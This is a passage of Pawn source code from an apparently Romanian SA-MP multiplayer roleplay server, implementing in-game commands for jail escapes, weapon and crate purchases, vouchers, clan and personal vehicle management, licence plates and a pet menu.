	ShowPlayerDialog(playerid, DIALOG_JAIL, DIALOG_STYLE_TABLIST_HEADERS, "Jail menu", "Optiune disponibila\tPret\nregim liber (curtea inchisorii)\t$30,000", "Select", "Cancel");
	return true;
}
cmd:hit(playerid, params[]) {
	if(PlayerInfo[playerid][pAJail] == 1) return 1;
	if(GetPlayerVirtualWorld(playerid) == 0) return 1;
    if(Escape[playerid] == 0 || Escape2[playerid] == 1) return 1;
	if(!PlayerToPoint(3.0, playerid, 53.6505,2508.6016,210.6388)) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi aceasta coamanda deoarece nu esti langa usa.");
	ApplyAnimation(playerid, "SWORD", "sword_4", 4.0, 1, 1, 1, 0, 0);
	SetTimerEx("EscapePlayer", 5000, 0, "d", playerid);	
	Escape2[playerid] = 1;
	PlayerTextDrawHide(playerid, InfosTD);
	SetPlayerAttachedObject(playerid, 5, 19631, 6, 0.048, 0.029, 0.103, -80.0, 80.0, 0.0);
	return 1;
}

redist::EscapePlayer(playerid) {
	if(!IsPlayerConnected(playerid)) return 1;
   	new test = 7 + random(6);
    EscapeProces[playerid] += test;
	if(EscapeProces[playerid] < 100) SCMf(playerid, 0xFFB870FF, "Continua sa lovesti usa! (%d%s)", EscapeProces[playerid], "%%");
	else {
		SendClientMessage(playerid, COLOR_YELLOW, "Ai reusit sa evadezi. Du-te la cel mai apropiat magazin de haine pentru a scapa de politie!");
		SetPlayerPos(playerid, -36.2864,2348.3958,24.1406);
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pJailed] = 0;
		PlayerInfo[playerid][pJailTime] = 0;
		Escape2[playerid] = 0;	
		finishAchievement(playerid, 11);
		EscapeProces[playerid] = 0;
		TextDrawHideForPlayer(playerid, Jailtime[playerid]);
		SetTimerEx("GiveWanted", 15000, false, "i", playerid);		
	}
    Escape2[playerid] = 0;
	ClearAnimations(playerid);
	ClearAnimations(playerid);
	RemovePlayerAttachedObject(playerid, 5);
	return 1;
}

redist::SQL_CheckPlayer(playerid, id) {
	if(!cache_num_rows()) 
		return ShowPlayerDialog(playerid, DIALOG_REGISTER5, DIALOG_STYLE_INPUT, "Referral:", "Ai fost adus de cineva pe comunitate?\nDaca da, scrie ID-ul jucatorului care te-a adus.\n{FFADAD}Referral ID invalid!", "Ok", "No");	
	
	new status=-1; gString[0] = EOS;
	cache_get_value_name(0, "name", gString, MAX_PLAYER_NAME);
	cache_get_value_name_int(0, "Status", status);
	listitemm[playerid] = id;
	listitemmm[playerid] = status;
	format(RegisterReferral[playerid], MAX_PLAYER_NAME, gString);
	format(gString, 100, "Esti sigur ca %s te-a adus pe comunitate?", gString);
	ShowPlayerDialog(playerid, DIALOG_REGISTER6, DIALOG_STYLE_MSGBOX, "Referral:", gString, "Ok", "Back");
	return true;
}

cmd:buygun(playerid, params[]) {
   	if(player_selected[playerid]) return true;
	if(!PlayerToPoint(2, playerid, 295.5615,-80.8107,1001.5156)) return true;
	if(!PlayerInfo[playerid][pGunLic]) return SendClientMessage(playerid, COLOR_LGREEN, "Nu ai licenta de arme.");
	for(new i=0;i<3;i++) TextDrawShowForPlayer(playerid, GunTD[i]);
	SelectTextDraw(playerid, COLOR_LIGHTBLUE);
	player_selected[playerid] = 9;
	GunObject[playerid] = CreatePlayerObject(playerid, 348, 295.33881, -81.58347, 1001.58270,   80.06000, -4.92000, 0.06000, 20.0);
	PlayerTextDrawSetString(playerid, GunPTD, "Desert eagle~n~~g~$5000");
	PlayerTextDrawShow(playerid, GunPTD);
	SetPlayerCameraPos(playerid, 295.804656, -77.917984, 1005.098999);
	SetPlayerCameraLookAt(playerid, 295.821594, -81.453475, 1001.563476);
	return true;
}

cmd:buycrate(playerid, params[]) {
	new x;
	if(PlayerToPoint(3, playerid, -2407.3787,-578.6539,132.7488)) x = 0;
	else if(PlayerToPoint(3, playerid, -2396.9878,-571.4478,132.1172)) x = 1;
	else if(PlayerToPoint(3, playerid, -2391.8081,-571.5518,132.1172)) x = 2;
	else if(PlayerToPoint(3, playerid, -2385.4275,-575.7543,132.1172)) x = 4;
	else if(PlayerToPoint(3, playerid, -2380.0889,-581.4764,132.1172)) x = 3;
	else if(PlayerToPoint(3, playerid, -2376.6707,-587.8674,132.1172)) x = 5;
	else if(PlayerToPoint(3, playerid, -2375.2468,-595.7172,132.1172)) x = 6;
	else if(PlayerToPoint(3, playerid, -2377.1558,-599.8726,132.1172)) x = 7;
	else if(PlayerToPoint(3, playerid, -2387.2368,-607.2504,132.7491)) x = 8;
	else if(PlayerToPoint(3, playerid, -2396.4150,-613.8842,132.6484)) x = 9;
	else if(PlayerToPoint(3, playerid, -2390.7346,-589.1584,132.7128)) x = 10;
	else return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in apropierea unui stand de unde poti cumpara un crate! (/gps > Crates)");
	AlegeCrates[playerid] = x;
	gString[0] = EOS;
	switch(x) {
		case 6: format(gString, 256, "{A0C4D3}Doresti sa cumperi un %s Crate?\nAcest crate costa: {5A8AD6}$499,000,000\n\n{9cbad6}Balanta contului tau: {5A8AD6}%d bpoints / %d premium points", CrateName[x][general], PlayerInfo[playerid][pBPoints], PlayerInfo[playerid][pPremiumPoints]);
		case 8: format(gString, 256, "{A0C4D3}Doresti sa cumperi un %s Crate?\nAcest crate costa: {5A8AD6}350 premium points\n\n{9cbad6}Balanta contului tau: {5A8AD6}%d bpoints / %d premium points", CrateName[x][general], PlayerInfo[playerid][pBPoints], PlayerInfo[playerid][pPremiumPoints]);
		case 9: format(gString, 256, "{A0C4D3}Doresti sa cumperi un %s?\nAcest crate costa: {5A8AD6}425 premium points\n\n{9cbad6}Balanta contului tau: {5A8AD6}%d bpoints / %d premium points", CrateName[x][general], PlayerInfo[playerid][pBPoints], PlayerInfo[playerid][pPremiumPoints]);
		default: format(gString, 256, "{9cbad6}Doresti sa cumperi un %s Crate?\nAcest crate costa: {5A8AD6}%d bpoints / %d premium points{9cbad6}\n\n{9cbad6}Balanta contului tau: {5A8AD6}%d bpoints / %d premium points", CrateName[x][general], CratePrice[x][0], CratePrice[x][1], PlayerInfo[playerid][pBPoints], PlayerInfo[playerid][pPremiumPoints]);
	}
	ShowPlayerDialog(playerid, DIALOG_BUYCRATES, DIALOG_STYLE_MSGBOX, "Buy Crate", gString, "Da", "Nu");
	return true;
}
stock totalVouchers(playerid) {
	new x=0,i;
	while(i<5) x+=PlayerInfo[playerid][pVoucher][i++];
	return x;
}
cmd:vouchers(playerid, params[]) {
	new szString[256];
	if(PlayerInfo[playerid][pVoucher][0] == 0 && PlayerInfo[playerid][pVoucher][1] == 0 && PlayerInfo[playerid][pVoucher][2] == 0&& PlayerInfo[playerid][pVoucher][3] == 0 && PlayerInfo[playerid][pVoucher][4] == 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai vouchere.");
	gString[0] = EOS; gQuery[0] = EOS;
	format(szString, sizeof(szString), "{FFFFFF}My Vouchers: {2bda01}%d {FFFFFF}(total)", 
	PlayerInfo[playerid][pVoucher][0]+PlayerInfo[playerid][pVoucher][1]+PlayerInfo[playerid][pVoucher][2]+PlayerInfo[playerid][pVoucher][3]+PlayerInfo[playerid][pVoucher][4]);
	strcat(gString, "#\tType\tTotal\tInfo\n");
	for(new i=0;i<sizeof(VoucherName);i++) format(gQuery, 128, "%d.\t{%s}%s\t%d in total\t%d premium points\n", i+1, VoucherName[i][voucherColor], VoucherName[i][voucherName], PlayerInfo[playerid][pVoucher][i], VoucherName[i][voucherInfo]), strcat(gString, gQuery);
	Dialog_Show(playerid, vouchers, DIALOG_STYLE_TABLIST_HEADERS, szString, gString, "Select", "Cancel");
	return true;
}

Dialog:vouchers(playerid, response, listitem, inputtext[])
{
    if(!response) return SendClientMessage(playerid, COLOR_GREY, "Actiune anulata!");
	if(!PlayerInfo[playerid][pVoucher][listitem]) return SendClientMessage(playerid, 0x33aa33FF, "Eroare: Nu ai un voucher de acel tip!");

	listitemm[playerid] = listitem;
	format(gString, sizeof(gString), "Esti sigur ca vrei sa folosesti 1x %s (%d PP)?", VoucherName[listitem][voucherName], VoucherName[listitem][voucherInfo]);
	Dialog_Show(playerid, vouchers_confirm, DIALOG_STYLE_MSGBOX, "Use Voucher", gString, "Select", "Cancel");
    return 1;
}

Dialog:vouchers_confirm(playerid, response, listitem, inputtext[])
{
    if(!response) return SendClientMessage(playerid, COLOR_GREY, "Actiune anulata!");
	if(!PlayerInfo[playerid][pVoucher][listitemm[playerid]]) return SendClientMessage(playerid, 0x33aa33FF, "Eroare: Nu ai un voucher de acel tip!");

	PlayerInfo[playerid][pVoucher][listitemm[playerid]]--;
	PlayerInfo[playerid][pPremiumPoints]+= VoucherName[listitemm[playerid]][voucherInfo];
	SCMf(playerid, -1, "{32ff00}{32ff00}(Voucher System) {FFFFFF}Ai folosit cu succes un %s (%d PP), mai ai %d vouchere de acest tip.", VoucherName[listitemm[playerid]][voucherName], VoucherName[listitemm[playerid]][voucherInfo], PlayerInfo[playerid][pVoucher][listitemm[playerid]]);
    return 1;
}

stock SaveTunning(idd, slot, object) {
	CarInfo[idd][cMod][slot] = object;
	mysql_format(SQL, gQuery, 128, "UPDATE `cars` SET `Mods`='%i %i %i %i %i %i %i %i %i %i %i %i %i %i' WHERE `ID` = '%i'",
		CarInfo[idd][cMod][0], CarInfo[idd][cMod][1], CarInfo[idd][cMod][2], CarInfo[idd][cMod][3], CarInfo[idd][cMod][4], CarInfo[idd][cMod][5],
		CarInfo[idd][cMod][6], CarInfo[idd][cMod][7], CarInfo[idd][cMod][8], CarInfo[idd][cMod][9], CarInfo[idd][cMod][10], CarInfo[idd][cMod][11],
		CarInfo[idd][cMod][12], CarInfo[idd][cMod][13], CarInfo[idd][cID]);
	mysql_tquery(SQL, gQuery);
	return true;
}

public OnPlayerWeaponShot(playerid, weaponid, hittype, hitid, Float:fX, Float:fY, Float:fZ) {	
	new Float:x,Float:y,Float:z,Float:vx,Float:vy,Float:vz;
	GetPlayerCameraFrontVector(playerid, x, y, z);
	GetPlayerPos(playerid, vx, vy, vz);
	if p_rob[playerid][r_in_rob] && p_rob[playerid][r_role] *then {
		new _b = p_rob[playerid][r_biz_type]!=18?p_rob[playerid][r_biz_type]:9;
		if GetDistanceFromDistance(fX, fY, fZ, rob_camera_pos[_b][0], rob_camera_pos[_b][1], rob_camera_pos[_b][2])<0.9&&camera_obj[playerid][_b][0]!=INVALID_OBJECT_ID *then {
			DestroyDynamicObject(camera_obj[playerid][_b][0]);
			camera_obj[playerid][_b][0] = INVALID_OBJECT_ID;
			if camera_obj[playerid][_b][0]==INVALID_OBJECT_ID&&camera_obj[playerid][_b][1]==INVALID_OBJECT_ID *then 
				SendClientMessage(playerid, COLOR_WHITE, "{47A028}(Rob) {FFFFFF}Ai distrus cele 2 camere! Du-te la seif pentru a lua sacii cu banii (apasa tasta 'C').");
		}
		if GetDistanceFromDistance(fX, fY, fZ, rob_camera_pos[_b][4], rob_camera_pos[_b][5], rob_camera_pos[_b][6])<0.9&&camera_obj[playerid][_b][1]!=INVALID_OBJECT_ID *then {
			DestroyDynamicObject(camera_obj[playerid][_b][1]);
			camera_obj[playerid][_b][1] = INVALID_OBJECT_ID;
			if camera_obj[playerid][_b][0]==INVALID_OBJECT_ID&&camera_obj[playerid][_b][1]==INVALID_OBJECT_ID *then 
				SendClientMessage(playerid, COLOR_WHITE, "{47A028}(Rob) {FFFFFF}Ai distrus cele 2 camere! Du-te la seif pentru a lua sacii cu banii (apasa tasta 'C').");
		}
	}
	if(hittype == BULLET_HIT_TYPE_VEHICLE) {
		if(ServerVehicles[hitid][vJob]) {
			SendClientMessage(playerid, COLOR_RED, "Nu poti face DM pe masinile de la job.");
			SetPlayerFreeze(playerid, 5);
			return true;
		}
	}

	if(!GetPlayerAmmo(playerid)) {
		SetPlayerArmedWeapon(playerid, 0);
		WeaponAmmo[playerid][GetWeaponSlot(weaponid)] = 0;
		Weapons[playerid][weaponid] = false;
	}
	else WeaponAmmo[playerid][GetWeaponSlot(weaponid)] --;
	
    if(weaponid == 24)
    {
        if((gettime() - shotTime[playerid]) < 1) shot[playerid] += 1;
        else shot[playerid] = 0;
        if(PlayerInfo[playerid][pAdmin] < 7 && shot[playerid] > 10) {
			new string[184];
			format(string, sizeof(string), "AdmWarning: %s(%d) a primit kick pentru rapid fire.",GetName(playerid),playerid);
			SendAdminMessage(COLOR_WARNING, string,1);
			KickEx(playerid);
        }
        shotTime[playerid] = gettime();
    }
	return true;
}

stock PersonalCar(playerid) {
	new idd = FindSpawnID(GetPlayerVehicleID(playerid));
	if((idd) == -1) return -1;
	if(!IsPlayerInAnyVehicle(playerid)) return -1;
	return CarInfo[idd][Userid]==PlayerInfo[playerid][pSQLID]?idd:-1;
}

stock PersonalClanCar(playerid) {
	new idd = FindSpawnID(GetPlayerVehicleID(playerid));
	if((idd) == -1) return -1;
	if(!IsPlayerInAnyVehicle(playerid)) return -1;
	return CarInfo[idd][cClan]==PlayerInfo[playerid][pClan]?idd:-1;
}

cmd:online(playerid, params[]) {
	new szDialog[2500];
	gQuery[0] = (EOS);
	strcat(szDialog, "id\tname\tscore\tping\n");
	Iter_Remove(Player, playerid);
	format(gQuery, 128, "%d\t{%06x}%s\t%d\t%d\n", playerid, GetPlayerColor(playerid) >>> 8, GetName(playerid), GetPlayerScore(playerid), GetPlayerPing(playerid));
	strcat(szDialog, gQuery);
	foreach(new i : Player) {
		format(gQuery, 128, "%d\t{%06x}%s\t%d\t%d\n", i, GetPlayerColor(i) >>> 8, GetName(i), GetPlayerScore(i), GetPlayerPing(i));
		strcat(szDialog, gQuery);
	}
	Iter_Add(Player, playerid);
	format(gQuery, 60, "Players: %d", Iter_Count(Player));
	ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_TABLIST_HEADERS, gQuery, szDialog, "Close", "");
	return true;
}

cmd:opencrate(playerid, params[]) return (!player_selected[playerid]&&!CrateTime[playerid])?ShowCrates(playerid):1;

cmd:battle(playerid, params[]) {
	if(DeelayCommand[playerid][18]>gettime())
		return SCMf(playerid, COLOR_LGREEN, "* You can't use this command for %d seconds.", DeelayCommand[playerid][18]-gettime());

	if(sscanf(params, "u", params[0]))
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/battle [playerid/name]");

	if(!IsPlayerConnected(params[0]))
		return true;

	if(!ProxDetectorS(10.0, playerid, params[0]))
		return SendClientMessage(playerid, COLOR_GREY, "Acel player nu este langa tine.");

	if(player_selected[params[0]])
		return true;

	if(PlayerInfo[playerid][pCaseBattle]<1) 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eorare: Nu ai case battle!");

	if(!PlayerInfo[params[0]][pCaseBattle])
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player nu are un case battle.");

	CaseInvite[params[0]] = playerid;
	SCMf(params[0], COLOR_LGREEN, ">> %s te-a invitat la un case battle foloseste (/accept battle %d) <<", GetName(playerid), playerid);
	SCMf(playerid, COLOR_LGREEN, ">> Case battle: L-ai invitat pe %s la o batalie. <<", GetName(params[0]));
	return true;
}

cmd:ccolor(playerid, params[]) {
	if(!PlayerInfo[playerid][pClan])
		return true;

	if(PlayerInfo[playerid][pClanRank] < 6)
		return true;

	new part,color;
	if(!IsPlayerInAnyVehicle(playerid)) return true;

	new idd=FindSpawnID(GetPlayerVehicleID(playerid));
	if(idd==-1)return true;

	if(CarInfo[idd][cClan] != PlayerInfo[playerid][pClan])
		return SendClientMessage(playerid, COLOR_GREY, "Aceasta masina nu face parte din clan-ul tau!");

	new clan=PlayerInfo[playerid][pClan];
	if(sscanf(params, "ii",part,color)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/carcolor <part (1/2)> <color>"), SendClientMessage(playerid, -1, "Foloseste /colors pentru a vedea o lista cu culorile existente.");
	if(ClanInfo[clan][ClanBank] < 2500) return SendClientMessage(playerid, COLOR_WHITE, "Your don't have $2,500!");
	if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid, COLOR_LGREEN, "* Trebuie sa fii la volan pentru a putea folosi aceasta comanda!");
	switch(part) {
		case 1: {
			if(color < 0 || color > 255) return SendClientMessage(playerid, -1, "Culori invalide!");
			SendClientMessage(playerid, COLOR_MONEY, "Ti-ai schimbat culorea la vehicul pentru $2,500.");
			CarInfo[idd][cColorOne] = color;
			ChangeVehicleColorEx(CarInfo[idd][Spawned], color, CarInfo[idd][cColorTwo]);
			_query("UPDATE cars SET ColorOne = %d WHERE ID=%d", color, CarInfo[idd][cID]);		
		}
		case 2: {
			if(color < 0 || color > 255) return SendClientMessage(playerid, -1, "Culori invalide!");
			SendClientMessage(playerid, COLOR_MONEY, "Ti-ai schimbat culorea la vehicul pentru $2,500.");
			CarInfo[idd][cColorTwo] = color;
			ChangeVehicleColorEx(CarInfo[idd][Spawned], CarInfo[idd][cColorOne], color);
			_query("UPDATE cars SET ColorTwo = %d WHERE ID=%d", color, CarInfo[idd][cID]);					
		}
		default:return true;
	}
	format(gString, sizeof gString, "{%s}[CLAN] %s a schimbat culoarea la %s in %d slot %d.", ClanInfo[clan][clColor], GetName(playerid), GetVehicleName(CarInfo[idd][cModel]), color, part);
	SendClanMessage(clan, gString);
	ClanInfo[clan][ClanBank] -= 2500;
	return true;
}

cmd:cpark(playerid) {
	if(!PlayerInfo[playerid][pClan])
		return true;

	if(PlayerInfo[playerid][pClanRank] < 6)
		return true;

	new car = GetPlayerVehicleID(playerid), idd;
	if(!IsPlayerInAnyVehicle(playerid)) 
		return SendClientMessage(playerid, COLOR_GREY, "Nu esti in vehiculul tau.");

	idd=FindSpawnID(car);
	if(idd == -1)
		return true;

	if(CarInfo[idd][cClan] != PlayerInfo[playerid][pClan])
		return SendClientMessage(playerid, COLOR_GREY, "Aceasta masina nu face parte din clan-ul tau!");

	GetVehiclePos(CarInfo[idd][Spawned], CarInfo[idd][cLocationx], CarInfo[idd][cLocationy], CarInfo[idd][cLocationz]); GetVehicleZAngle(CarInfo[idd][Spawned], CarInfo[idd][cAngle]);
	mysql_format(SQL, gQuery, sizeof(gQuery),
		"UPDATE clanvehicle SET Model='%d', Locationx='%f', Locationy='%f', Locationz='%f', Angle='%f', ColorOne='%d', ColorTwo='%d', Value='%d', ClanID='%i', Rank='1' WHERE ID=%d",
	CarInfo[idd][cModel], CarInfo[idd][cLocationx], CarInfo[idd][cLocationy], CarInfo[idd][cLocationz], CarInfo[idd][cAngle], CarInfo[idd][cColorOne], CarInfo[idd][cColorTwo], CarInfo[idd][cValue], PlayerInfo[playerid][pClan], CarInfo[idd][cID]);
	mysql_tquery(SQL, gQuery, "", "");
	DestroyClanVehicle(idd);
	format(gString, 128, "{%s}[CLAN] %s a parcat masina %s.", ClanInfo[CarInfo[idd][cClan]][clColor], GetName(playerid), GetVehicleName(CarInfo[idd][cModel]));
	SendClanMessage(CarInfo[idd][cClan], gString);
	return true;
}

cmd:park(playerid, params[]) {
	#pragma unused params
	new idd = PersonalCar(playerid), engine, lights, alarm, doors, bonnet, boot, objective, Float:vHP;
	GetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, lights, alarm, doors, bonnet, boot, objective);
	GetVehicleHealth(GetPlayerVehicleID(playerid), vHP);

	if(idd == -1) return SendErrorMsg(playerid, "Nu esti in unul dintre vehiculele tale personale!");
	if(GetPlayerState(playerid) != 2) return SendErrorMsg(playerid, "Trebuie sa fii la volan pentru a putea folosi aceasta comanda!");
	if(engine == VEHICLE_PARAMS_ON && !IsABike(GetVehicleModel(GetPlayerVehicleID(playerid)))) return SendErrorMsg(playerid, "Nu poti parca un vehicul ce are motorul pornit!");
	if(PlayerToPoint(50.0, playerid, spawn_random[1][0],spawn_random[1][1],spawn_random[1][2]) || PlayerToPoint(50.0, playerid, spawn_random[0][0],spawn_random[0][1],spawn_random[0][2]) || PlayerToPoint(50.0, playerid, spawn_random[2][0],spawn_random[2][1],spawn_random[2][2])) return SendErrorMsg(playerid, "Nu poti parca o masina in aceasta locatie.");
	if(vHP < 800) return SendErrorMsg(playerid, "Nu poti parca masina cand are sub 800 'viata'!");

	if(CarInfo[idd][cGarage] != -1) {
		mysql_format(SQL, gQuery, 128, "UPDATE `cars` SET `Garage` = '-1' WHERE `ID` = '%i'", CarInfo[idd][cID]);
		mysql_tquery(SQL, gQuery);
		CarInfo[idd][cGarage] = -1;
		total_vehicle_in_garage[playerid] --;
	}
	
	va_SendClientMessage(playerid, COLOR_CLIENT, "Your %s has been parked.", GetVehicleName(CarInfo[idd][cModel]));
	GetVehiclePos(GetPlayerVehicleID(playerid), CarInfo[idd][cLocationx], CarInfo[idd][cLocationy], CarInfo[idd][cLocationz]); GetVehicleZAngle(GetPlayerVehicleID(playerid), CarInfo[idd][cAngle]);
	CarInfo[idd][cLastPos][0] = CarInfo[idd][cLocationx]; CarInfo[idd][cLastPos][1] = CarInfo[idd][cLocationy]; CarInfo[idd][cLastPos][2] = CarInfo[idd][cLocationz];

	for(new i = 0; i < 14; i++) CarInfo[idd][cMod][i] = GetVehicleComponentInSlot(CarInfo[idd][Spawned], i);
	_query("UPDATE `cars` SET `Mods`='%i %i %i %i %i %i %i %i %i %i %i %i %i %i' WHERE `ID`='%i'", CarInfo[idd][cMod][0], CarInfo[idd][cMod][1], CarInfo[idd][cMod][2],CarInfo[idd][cMod][3], CarInfo[idd][cMod][4], CarInfo[idd][cMod][5], CarInfo[idd][cMod][6], CarInfo[idd][cMod][7], CarInfo[idd][cMod][8], CarInfo[idd][cMod][9],CarInfo[idd][cMod][10], CarInfo[idd][cMod][11], CarInfo[idd][cMod][12], CarInfo[idd][cMod][13], CarInfo[idd][cID]);

	saveCar(idd); DestroyPlayerCar(idd);
	SpawnPlayerCar(playerid, idd);
	PutPlayerInVehicleEx(playerid, 0, CarInfo[idd][Spawned]);
	return true;
}

cmd:iterators(playerid, params[]) {
	if(!IsAdmin(playerid, 7)) return true;
	SCMf(playerid, COLOR_LGREEN, "Staff<ADMIN>: %d, Staff<HELPER>: %d, IsSpeed: %d, airPlayers: %d, drop_prize: %d", Iter_Count(Staff<ADMIN>), Iter_Count(Staff<HELPER>), Iter_Count(IsSpeed), Iter_Count(air_Players), Iter_Count(drop_prize));
	SCMf(playerid, COLOR_LGREEN, "Rainbows[0]: %d, Rainbows[1]: %d, Rainbows[2]: %d, Rainbows[3]: %d", Iter_Count(Rainbows<0>), Iter_Count(Rainbows<1>), Iter_Count(Rainbows<2>), Iter_Count(Rainbows<3>));
	SCMf(playerid, COLOR_LGREEN, "LoginQueue<0>: %d, LoginQueue<1>; %d, PlayerVips: %d, PlayerPremiums: %d", Iter_Count(LoginQueue<0>), Iter_Count(LoginQueue<1>), Iter_Count(PlayerVips<NORMAL>), Iter_Count(PlayerPremiums));
	gString[0]=0;
	for(new i=0;i<MAX_FACTIONS;++i) {
		format(gQuery, sizeof gQuery, "faction_players<%d>: %d, ", i+1, Iter_Count(faction_players<i+1>));
		strcat(gString, gQuery);
		if(i % 4 == 0) SendClientMessage(playerid, COLOR_LGREEN, gString), gString[0] = 0;
	}
	return true;
}

cmd:pickup(playerid, params[]) {
	if((!JobWorking[playerid] && PlayerInfo[playerid][pJob] != 4) || InHand[playerid])
		return true;
	
	new i = BagTime[playerid];
	if(!PlayerToPoint(2.5, playerid, trashObj[i][0], trashObj[i][1], trashObj[i][2]))
		return true;

	InHand[playerid] = true;
	SetPlayerAttachedObject(playerid, 3, 1264, 6, 0.2229, 0.0270, 0.0409, 0.0000, -78.0000, 0.0000, 0.4959, 0.5529, 0.4140);
	BagTime[playerid] = RandomEx(3, 5);

	gString[0] = (EOS);
	format(gString, 128, "ai primit ~r~%d ~w~~h~kilograme de gunoi (~y~%d/25~w~~h~)~n~du-te in spatele masinii de gunoi si apasa pe tasta y pentru a pune sacu", BagTime[playerid], CurseFacute[playerid]+BagTime[playerid]>=25?25:CurseFacute[playerid]+BagTime[playerid]);
	showInfo(playerid, gString, 7);
	return true;
}

cmd:petmenu(playerid, params[]) {
	if(PlayerInfo[playerid][pLevel] < 3) 
		return SendClientMessage(playerid, COLOR_RED, "Error: {FFFFFF}You need level 3 to use pet menu.");

	format(srsString, 80, "%d/%d pet points for level %d", PlayerInfo[playerid][pPetPoints], PlayerInfo[playerid][pPetLevel]*1500, PlayerInfo[playerid][pPetLevel] + 1);
	format(gQuery, 60, "{3BBF0B}%s", PlayerInfo[playerid][pPetName]);
	format(gString, 256,"Function\tResult\nBuy Level\t%s\nPet Appearance\t%s\nTog Pet\t%s\nPet Name\t%s\nPet Benefits\tClick for informations", PlayerInfo[playerid][pPetLevel]<30?(srsString):("0 XP, you have the maxim level."), name_pet[PlayerInfo[playerid][pPet]], PlayerInfo[playerid][pPetStatus]?("{3BBF0B}Enabled"):("{FF0000}Disabled"), PlayerInfo[playerid][pPetLevel]<21?("{FF0000}Your pet needs to be level 21 to set a name."):(gQuery));
	ShowPlayerDialog(playerid, DIALOG_PET, DIALOG_STYLE_TABLIST_HEADERS, "Pet Menu", gString, "Select", "Cancel");
	return true;
}
cmd:swapcolors(playerid, params[]) {
	#pragma unused params
	if(PersonalCar(playerid) == -1) return SendErrorMsg(playerid, "Nu esti in unul dintre vehiculele tale personale!");
	if(GetPlayerState(playerid) != 2) return SendErrorMsg(playerid, "Trebuie sa fii la volan pentru a putea folosi aceasta comanda!");

	new idd = PersonalCar(playerid), color1, color2;
	color1 = CarInfo[idd][cColorOne]; color2 = CarInfo[idd][cColorTwo];
	CarInfo[idd][cColorOne] = color2; CarInfo[idd][cColorTwo] = color1;
	
	ChangeVehicleColorEx(GetPlayerVehicleID(playerid), CarInfo[idd][cColorOne], CarInfo[idd][cColorTwo]);
	SendClientMessage(playerid, COLOR_WHITE, "Ti-ai inversat culorile!");
	_query("UPDATE cars SET ColorOne='%d', ColorTwo='%d' WHERE ID=%d", color2, color1, CarInfo[idd][cID]);
	return true;
}
cmd:carplatecolor(playerid, params[]) {
    #pragma unused params
	if(PersonalCar(playerid) == -1) return SendErrorMsg(playerid, "Nu esti in unul dintre vehiculele tale personale!");
	if(PlayerInfo[playerid][pPremiumPoints] < 100) return SendErrorMsg(playerid, "Nu ai 100 premium points.");
	return ShowPlayerDialog(playerid, DIALOG_CARPLATECOLOR, DIALOG_STYLE_LIST, "{f4ad42}Car {FFFFFF}Plate Color", "{0087FE}Blue\n{4700C2}Dark purple\n{EBFF00}Yellow\n{EF00FF}Purple\n{40FF00}Green\n{9CFF29}Lime green\n{0E7F03}Dark green\n{FF9A00}Orange\n{6E6E6E}Black\n{FF4C9D}Pink\n{F4FA58}Yellow 2\n{00BFFF}Blue 2\n{819FF7}Blue 3\n{FE9A2E}Orange 2\n{FA8258}Orange 3\n{00FF40}Green 2\n{D358F7}Purple 2\n{4169E1}Royal Blue\n{9ACD32}YellowGreen\n{F0E68C}Khaki\n{BDB76B}DarkKhaki\n{FF1493}DeepPink\n{9966CC}Amethyst\n{F0B2B2}PinkOrange\n{DB7093}PaleVioletRed", "Select", "Cancel");
}

cmd:carplate(playerid, params[]) {
	extract params -> new string:plate[32]; else return SendUsageMsg(playerid, "carplate [text]");
	if(PersonalCar(playerid) == -1) return SendErrorMsg(playerid, "Nu esti in unul dintre vehiculele tale personale!");
	if(!(5 <= strlen(plate) <= 11)) return SendErrorMsg(playerid, "Numarul de inmatriculare poate avea intre 5 si 10 caractere.");
	if(IsNumeric(plate)) return SendErrorMsg(playerid, "Nu poti pune un numar format doar din cifre.");

	mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `cars` WHERE `License` = '%e' LIMIT 1", plate);
	mysql_tquery(SQL, gQuery, #check_v_carplate, #is, playerid, plate);
	return true;
}

redist::check_v_carplate(playerid, const carplate[]) {
	if(cache_num_rows()) {
		new owner[64];
		cache_get_value_name(0, "Owner", owner, MAX_PLAYER_NAME);          
		SendErrorMsg(playerid, "Numarul '%s' este deja folosit de vehiculul detinut de %s.", carplate, owner);
		return true;
	}	 

	format(gString, sizeof gString, "{FFFFFF}Esti sigur ca vrei sa iti schimbi numarul de inmatriculare in \"{0e8b02}%s{FFFFFF}\"?\nVei plati {0e8b02}$%d0.000.000{FFFFFF} pentru acest numar.",carplate, checkPrice(carplate));
	format(p_carPlate[playerid], 50, "%s", carplate);
	return ShowPlayerDialog(playerid, DIALOG_CARPLATE, DIALOG_STYLE_MSGBOX, "{f4ad42}Car {FFFFFF}Plate", gString, "Da", "Nu");
}
stock checkPrice(const plate[]) {
	new carplate;
	new char_plate = strlen(plate);
	carplate = char_plate;
	return carplate;
}


cmd:carcolor(playerid, params[]) {
	new string[128],part,color;
	if(Iter_Count(MyVehicle<playerid>) == 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai un vehicul personal!");
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu esti in vehiculul tau.");
	if(sscanf(params, "ii",part,color)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/carcolor <part (1/2)> <color>"), SendClientMessage(playerid, -1, "Foloseste /colors pentru a vedea o lista cu culorile existente.");
	if(GetPlayerCash(playerid) < 2500) return SendClientMessage(playerid, COLOR_WHITE, "Your don't have $2,500!");
	new car = GetPlayerVehicleID(playerid);
	if(PersonalCar(playerid) == -1) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in unul dintre vehiculele tale personale!");
	if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid, COLOR_LGREEN, "* Trebuie sa fii la volan pentru a putea folosi aceasta comanda!");
	new idd = PersonalCar(playerid);
	if(part < 1 || part > 2) return true;
	switch(part) {
		case 1: {
			if(color > 127) {
